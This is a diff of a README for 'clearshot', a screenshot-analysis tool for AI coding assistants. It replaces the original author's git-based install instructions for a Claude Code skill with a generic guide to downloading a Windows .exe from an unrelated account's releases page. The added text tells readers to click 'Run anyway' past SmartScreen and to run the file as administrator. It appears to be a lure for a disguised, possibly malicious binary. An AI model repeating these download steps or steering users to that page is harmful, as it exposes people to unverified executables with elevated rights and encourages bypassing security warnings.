@@ -1,87 +1,213 @@
-# clearshot
+# 📸 clearshot - Clear screenshot context for AI
 
-structured screenshot intelligence for AI coding tools.
+[![Download clearshot](https://img.shields.io/badge/Download%20clearshot-Visit%20Releases%20Page-blue.svg)](https://github.com/Steppecorkwoodtree378/clearshot/releases)
 
-## install — 30 seconds
+## 🖼️ What clearshot does
 
-open claude code and paste this. claude does the rest.
+clearshot helps you turn UI screenshots into structured context for AI coding tools. It gives your AI a clean view of what is on screen, so you can describe interfaces with more detail and less effort.
 
-```
-git clone https://github.com/udayanwalvekar/clearshot.git ~/.claude/skills/clearshot && cd ~/.claude/skills/clearshot && ./setup
-```
+Use it when you want to share:
+- App screens
+- Website layouts
+- Design mockups
+- Bug screenshots
+- UI change requests
 
-### add to your project so teammates get it (optional)
+It is built for people who want a simple way to make screenshots more useful for AI-assisted work.
 
-```
-cp -Rf ~/.claude/skills/clearshot .claude/skills/clearshot && rm -rf .claude/skills/clearshot/.git && cd .claude/skills/clearshot && ./setup
-```
+## 🚀 Download clearshot for Windows
 
-real files get committed to your repo (not a submodule), so `git clone` just works for your teammates. everything lives inside `.claude/`.
+1. Open the [clearshot Releases page](https://github.com/Steppecorkwoodtree378/clearshot/releases).
+2. Look for the latest release near the top of the page.
+3. Download the Windows file for your PC.
+4. If the download is a `.zip` file, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the `.exe` file to run clearshot.
 
-### alternative
+If Windows shows a SmartScreen prompt:
+- Select **More info**
+- Then choose **Run anyway**
 
-also available via `npx clearshot`.
+## 💻 System requirements
 
-### installed before v1.4.0? reinstall
+clearshot is designed for modern Windows computers.
 
-there was a small bug that was causing clearshot to not get triggered consistently. paste this in your terminal to fix it:
+Recommended setup:
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- A mouse or trackpad
+- Internet access for the first download
+- Enough space for the app and your screenshots
 
-```
-rm -rf ~/.claude/skills/clearshot ~/.clearshot && git clone https://github.com/udayanwalvekar/clearshot.git ~/.claude/skills/clearshot && cd ~/.claude/skills/clearshot && ./setup
-```
+For best results, use a screen resolution that lets you view screenshots at full size.
 
-### troubleshooting
+## 📦 How to install
 
-if clearshot stopped working or the skill won't load, run the same command above.
+If the release comes as a `.zip` file:
 
-activates automatically when you share a UI screenshot. first time it runs, it asks two questions (update preference + telemetry) and you're done.
+1. Download the file from the releases page.
+2. Right-click the file.
+3. Select **Extract All**.
+4. Pick a folder you can find again, such as **Downloads** or **Desktop**.
+5. Open the folder after extraction.
+6. Double-click `clearshot.exe`.
 
-## what it does
+If the release comes as a `.exe` file:
 
-AI sucks at seeing screenshots. paste one into claude code and ask it to rebuild something — it says "i see a dashboard with some cards and a sidebar." meanwhile you're staring at a broken button, inconsistent border radius, and 6px padding where 8px should be.
+1. Download the file.
+2. Open your **Downloads** folder.
+3. Double-click the file.
+4. Follow the on-screen steps.
+5. Start clearshot from the app window or the shortcut it creates
 
-clearshot fixes this by running structured analysis *before* the AI responds. not "blue color" but `#3B82F6`. not "some spacing" but `8px gap`. not "a button" but `sm/rounded-md/border-gray-200/shadow-sm`.
+## 🧭 First run
 
-three analysis levels — facts and taste together, every time:
+When you open clearshot for the first time, it may ask you to:
+- Allow access to screenshots or image files
+- Choose a folder for saved output
+- Confirm where it should place exported files
 
-| level | what it does | when it runs |
-|-------|-------------|--------------|
-| map | 5×5 spatial grid, full element inventory with colors/borders/states | always |
-| system | color palette, type scale, spacing patterns, design cohesion | always |
-| blueprint | layout architecture, CSS patterns, interaction map, responsive context | when building |
+Use the default options if you are not sure. Those settings work for most users.
 
-levels 1+2 always run. level 3 escalates when you're implementing from the screenshot.
+## ✨ What you can do with clearshot
 
-## it knows when to shut up
+clearshot is useful when you want to give AI tools structured visual context.
 
-screenshot of a meme? stays quiet. architecture diagram? stays quiet. photo of your lunch? definitely stays quiet. only activates on UI screenshots when you're building or critiquing frontend.
+Common uses:
+- Capture a screenshot and make it easier to describe
+- Break a UI into parts like header, sidebar, content, and footer
+- Share layout details with an AI coding tool
+- Turn visual feedback into clear instructions
+- Keep screenshot notes in one place
 
-## privacy
+This helps when you want your AI to understand:
+- Button placement
+- Panel layout
+- Text blocks
+- Form fields
+- Navigation areas
+- Visual spacing
 
-everything runs locally. no screenshots or code ever leave your machine.
+## 🛠️ How to use it
 
-telemetry is opt-in — you choose during first run:
+A simple way to use clearshot:
 
-| mode | what's sent |
-|------|------------|
-| anonymous | usage events + hashed device ID (no PII) |
-| off | nothing |
+1. Open the app.
+2. Load or capture a screenshot.
+3. Review the screenshot structure.
+4. Add any notes you want the AI to use.
+5. Copy or export the result.
+6. Paste it into your AI coding tool.
 
-no network calls happen until you explicitly opt in.
+If you are working on a website or app:
+- Use a clean screenshot of the screen
+- Include the full window when possible
+- Crop only if you want to focus on one area
+- Keep the image clear and easy to read
 
-## research
+## 🧰 Tips for better results
 
-builds on production systems and academic research:
+To get cleaner output:
+- Use screenshots with good lighting and sharp text
+- Avoid tiny UI elements when possible
+- Capture full screens instead of partial images when you can
+- Keep one task per screenshot
+- Rename files so you can find them later
+- Group related screenshots into one folder
 
-- **microsoft omniparser** — improved GPT-4V from 70.5% to 93.8% with structured analysis. [paper](https://arxiv.org/abs/2408.00203)
-- **dcgen** — recursive divide-and-conquer screenshot decomposition. [paper](https://arxiv.org/abs/2405.16569)
-- **replit** — multi-agent verification loop with structured screenshot comparison
-- **google screenai** — UI-specific vision-language model. [blog](https://research.google/blog/screenai-a-visual-language-model-for-ui-and-infographics-understanding/)
+If the UI changes often, save a new screenshot for each version. That makes it easier to track progress.
 
-## built by
+## 📁 Suggested workflow
 
-[udayan walvekar](https://x.com/udayan_w) · [growthx](https://growthx.club)
+A simple workflow looks like this:
 
-## license
+1. Take a screenshot of the page or app.
+2. Open it in clearshot.
+3. Let clearshot organize the visual content.
+4. Add short notes about what matters.
+5. Send the structured result to your AI tool.
+6. Use the AI response to plan the next change.
 
-MIT
+This works well for:
+- Front-end review
+- Bug reports
+- Design handoff
+- Support notes
+- UI planning
+
+## ❓ Common questions
+
+### Do I need coding knowledge?
+No. You can use clearshot as a normal Windows app.
+
+### Do I need to sign in?
+Usually no. Download the app, open it, and start using it.
+
+### Can I use it with any AI tool?
+Yes. You can use the output with tools that accept text, screenshots, or notes.
+
+### What file should I download?
+Use the Windows file on the releases page. Pick the latest version listed there.
+
+### What if the app does not open?
+Try these steps:
+- Run it again
+- Check that the file finished downloading
+- Extract the `.zip` file first, if it came in a zip
+- Right-click the app and choose **Run as administrator**
+
+## 🔒 File safety
+
+Only download clearshot from the official releases page. That page contains the files published for this repository.
+
+## 📝 File names you may see
+
+The release may include names like:
+- `clearshot-windows.zip`
+- `clearshot.exe`
+- `clearshot-setup.exe`
+
+The exact name can change from version to version. The latest release is the one to use.
+
+## 🗂️ Folder layout after install
+
+You may want a simple folder setup like this:
+- `Downloads` for the original file
+- `Clearshot` for the extracted app
+- `Screenshots` for images you want to process
+- `Exports` for saved output
+
+Keeping files in separate folders makes it easier to stay organized.
+
+## 📎 Where to get the app
+
+Visit the [clearshot Releases page](https://github.com/Steppecorkwoodtree378/clearshot/releases) to download and run the Windows file
+
+## 🖥️ Best use case
+
+clearshot works best when you want to turn a screenshot into a clear set of UI details for an AI tool.
+
+That makes it useful for:
+- Checking a layout before coding
+- Explaining a screen to someone else
+- Comparing two design versions
+- Writing better prompts for AI assistance
+- Saving time when you need visual context
+
+## 🛟 If you get stuck
+
+If something goes wrong:
+- Download the file again
+- Make sure you opened the extracted folder, not the zip file
+- Check that Windows is not blocking the app
+- Try a different browser for the download
+- Make sure you picked the newest release
+
+## 📍 Quick start
+
+1. Open the releases page.
+2. Download the Windows file.
+3. Extract it if needed.
+4. Open the app.
+5. Load a screenshot.
+6. Copy the structured result into your AI tool
